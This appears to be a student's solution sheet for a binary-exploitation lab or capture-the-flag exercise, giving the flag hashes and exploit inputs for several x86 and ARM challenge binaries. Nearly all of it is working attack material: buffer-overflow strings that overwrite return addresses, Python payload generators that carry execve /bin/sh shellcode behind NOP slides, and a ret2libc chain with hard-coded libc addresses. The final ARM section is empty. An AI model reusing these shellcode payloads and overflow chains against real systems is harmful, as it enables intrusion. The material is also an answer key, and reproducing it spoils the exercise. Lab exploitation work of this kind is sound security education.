# Solution:

## part 0

### x86

part0 x86: f01aa318b134682ca30886824d267c3c
input: 

command: `./part0x00`

### arm

part0 arm: 81965669ac87a7de524c1cf68b4e3e60
input:

command: `./part0x00`

## part 1

### x86

part1 x86: ab2b3751d7c03ad34660be0ba7f2fa42
input: 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xdb\x85\x04\x08'

command:
`echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xdb\x85\x04\x08' | ./part0x01`

### arm

part2 arm: ad9ed34a9bd958c558157c91b37504b4
input: \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\xa0\x05\x01\x00

command: 
`echo -e '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\xa0\x05\x01\x00' | ./part0x01`

payload code:
```
import struct
padding = "AAAAAAAAAAAAAAAABBBBBBBB"
system = struct.pack("I", 0x000105a0)
s = padding + system
# print (s)
s1 = "\\x".join("{:02x}".format(ord(c)) for c in s)
print (s1)
```

## part 2

### x86

part2 x86: 10467e5e194180c70c9f4f07fa7150f1
input: 

command:
`env -i ./part0x02 /tmp/kunal29_testpayload8`

payload code:
```
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
eip = struct.pack("I",  0xffffcf30) # submissionVM x86 # use strace -e raw=read 
nopslide = "\x90"*1000
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
s = padding+eip+nopslide+payload
print (s)
```

### arm

part2 arm: 5fdefc407d56d4c381ff621149fa5a7b
input: 


command: 
`./part0x02 /tmp/kunalx09_payload5`

payload code:
```
padding = "AAAAAAAAAAAAAAAABBBBBBBB"
eip = struct.pack("I", 0xbeffefb8) # submissionVM arm
nopslide = "\x90"*4000 #submissionVM arm
payload = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1" + "\x03\xa0\x52\x40\xc2\x71\x05\xb4" + "\x69\x46\x0b\x27\x01\xdf\x7f\x40" + "\x2f\x62\x69\x6e\x2f\x73\x68\x41"
s = padding+eip+nopslide+payload
print(s)
```

## part 3

### x86

part2 x86: e4a984bd2e5058a317d0979d76106a75
input: 

command:
`./part0x03 /tmp/kunalx29_payload1`

payload code:
```
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
system = struct.pack("I", 0xf7e1a250) # 0xf7e18250) # add libc
return_after_system = "AAAA"
eip = struct.pack("I", 0xf7f5b3cf) # 0xf7f593cf) # addr "/bin/sh"
s = padding + system + return_after_system + eip
print (s)
```
### arm

